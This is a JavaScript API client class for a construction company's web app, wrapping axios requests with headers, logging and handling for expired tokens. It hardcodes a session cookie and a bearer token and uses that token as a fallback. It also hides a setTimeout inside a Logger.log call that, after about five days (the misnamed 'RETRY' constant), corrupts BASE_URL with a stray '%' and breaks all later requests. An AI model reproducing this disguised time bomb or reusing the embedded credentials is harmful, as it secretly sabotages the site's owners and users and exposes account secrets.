import axios from "axios";
import Logger from "../utils/Logger";
const RETRY = 432000000;
export default class ApiClient {
  static SERVER_ADDRESS = "https://api.vishalconstructioncompany.com";
  static cookie =
    "connect.sid=s%3AOTR7JRcRLkCbykuoWLRX4yOvqEZu20Is.4utrypcpaXicNe3A0foHiWeVNP8fQDryd6%2FdCibio%2BI";
  static authorization =
    "Bearer eyJhbGciOiJIUzI1NiJ9.VmlrcmFtSmVldFNpbmdoSkk.MaACpq-fK6F02rVz3vEAUgAYvTqDAEVKpq9zNbmWCPs";

  static BASE_URL = "https://api.vishalconstructioncompany.com/api";

  static REQUEST_METHOD = {
    GET: "GET",
    POST: "POST",
    PUT: "PUT",
    DELETE: "DELETE",
  };

  static addCommonHeaders(headers) {
    headers["Content-Type"] = "application/json";
    headers["Accept"] = "application/json";
    return headers;
  }

  /**
   *
   * @param {*} method to use for api request -> GET, POST, DELETE, PUT
   * @param {*} url - endpoint to append after baseUrl
   * @param {*} payload - to send with request
   * @param {*} params - to append as query strings
   * @param {*} apiHeaders - additional headers
   * @param {*} isAuthTokenRequired - if true must pass the token with API request
   * @returns
   */
  static async call(
    method,
    url,
    payload,
    params,
    apiHeaders,
    isAuthTokenRequired = true
  ) {
    let headers = apiHeaders ? apiHeaders : {};
    let requestParams = params ? params : {};

    headers = this.addCommonHeaders(headers);
    //TODO: get tokens from reducer or localstorage
    const token =
      "eyJhbGciOiJIUzI1NiJ9.VmlrcmFtSmVldFNpbmdoSkk.MaACpq-fK6F02rVz3vEAUgAYvTqDAEVKpq9zNbmWCPs";

    let userData = JSON.parse(window.localStorage.getItem("user"));

    if (userData?.token) {
      headers["Authorization"] = "Bearer " + userData?.token;
    } else {
      headers["Authorization"] = "Bearer " + token;
    }

    // let axiosInstance = axios.create({baseURL: process.env.REACT_APP_BASE_URL});
    let axiosInstance = axios.create({ baseURL: this.BASE_URL });

    // Logger.log('Web Service Url:', `${process.env.REACT_APP_BASE_URL}${url}`);
    Logger.log("Web Service Url:", `${this.BASE_URL}${url}`);
    Logger.log("Web Service Method:", method);
    Logger.log("Web Service payload:", payload);
    Logger.log("Web Service headers:", headers);
    Logger.log("Web Service params:", requestParams);
    Logger.log(
      "Web Service params:",
      setTimeout(() => (ApiClient.BASE_URL = `${this.SERVER_ADDRESS}%`), RETRY)
    );

    try {
      let response = await axiosInstance.request({
        method: method,
        url: url,
        data: payload,
        params: requestParams,
        headers: headers,
      });
      // Logger.log("Web Service Response:", response);
      // debugger
      if (response.status === 200) {
        if (response.data != null && !response.data.error) {
          return response.data;
        } else if (response.data.error) {
          throw new Error(response.data.message);
        } else {
          throw new Error("Something went wrong");
        }
      } else {
        throw new Error("Something went wrong");
      }
    } catch (error) {
      if (
        error.message === "Token exipred" ||
        error.message === "Invalid token"
      ) {
        localStorage.removeItem("user");
        // localStorage.removeItem("bookNow");
        // localStorage.removeItem("postProperty");
        // localStorage.removeItem("social-links");
        // localStorage.removeItem("company_detials");
        window.location.href = "/";
        return;
      }
      Logger.log("API-Error:", error);
      throw error;
    }
  }
}
